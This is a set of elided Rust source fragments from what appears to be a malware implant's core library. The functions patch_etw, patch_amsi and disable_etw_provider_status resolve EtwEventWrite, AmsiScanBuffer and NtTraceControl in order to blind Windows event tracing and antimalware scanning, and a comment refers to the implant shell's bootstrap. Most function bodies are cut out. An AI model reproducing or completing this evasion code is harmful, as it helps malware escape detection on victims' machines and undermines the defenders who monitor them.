...
pub unsafe fn patch_etw() -> Result<(), &'static str> {
    let addr = nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"EtwEventWrite")
...
pub unsafe fn patch_amsi() -> Result<(), &'static str> {
    let addr = match nyx_implant_core::resolve::export_addr(b"amsi.dll", b"AmsiScanBuffer") {
        Some(a) => a,
...
/// context. `pub` (WP-C crate split): the shell's `entry` bootstrap writes it
/// directly across the crate boundary; other callers go through `blind_err()`
/// rather than touching the cell directly.
pub static BLIND_ERR: nyx_implant_core::cell::SyncCell<Option<&'static str>> =
    nyx_implant_core::cell::SyncCell::new(None);
...
pub unsafe fn disable_etw_provider_status(guid: &[u8; 16], control_code: u32) -> i32 {
    ...
    let addr = match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtTraceControl") {
        Some(a) => a,
